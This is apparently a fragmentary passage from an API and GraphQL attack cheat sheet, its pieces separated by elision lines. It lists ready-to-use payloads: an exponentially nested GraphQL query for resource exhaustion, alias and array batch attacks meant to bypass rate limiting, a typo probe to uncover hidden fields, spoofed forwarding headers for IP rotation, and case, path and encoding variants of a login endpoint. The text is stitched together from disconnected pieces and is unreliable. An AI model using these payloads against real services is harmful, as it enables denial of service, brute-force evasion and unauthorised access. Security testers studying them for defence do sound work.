...
# UUID prediction — check if UUIDs appear in other responses
...
// Then verify which fields were persisted:
...
### Depth, Complexity, and Batch Attacks

```graphql
# Depth attack — exponential resource consumption
{
  users { friends { friends { friends { friends { name } } } } }
}

# Alias batch attack — bypass rate limiting
{
...
Batch query attack via array body:
```json
[
...
### Field Suggestion and Fragment Authorization Bypass

```graphql
# Field suggestion — discover hidden fields via typos
{ users { passwor } }
...
```
# IP rotation via header spoofing
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4

# Case/path/method/encoding variations
/api/login
/API/LOGIN
/api/login/
/api/./login
